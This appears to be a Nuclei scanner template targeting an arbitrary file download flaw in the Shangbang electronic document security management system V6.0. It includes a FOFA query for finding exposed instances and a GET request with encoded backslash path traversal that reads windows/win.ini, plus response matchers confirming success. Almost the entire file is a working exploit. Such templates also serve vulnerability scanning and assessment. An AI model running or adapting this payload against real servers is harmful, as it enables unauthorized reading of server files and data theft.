id: shangbon-backup-fileread
info:
  name: 电子文档安全管理系统V6.0接口backup - fileread
  author: leadlife
  severity: high
  description: 济南上邦电子科技有限公司电子文档安全管理系统 V6.0 resources/backup存在任意文件下载漏洞，攻击者可通过该漏洞获取服务器所有文件信息
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV6.0%E6%8E%A5%E5%8F%A3backup%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="docsafe/docsafe.nocache.js"
  tags: shangbon,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/resources/backup//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini"


    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"

      - type: status
        status:
          - 200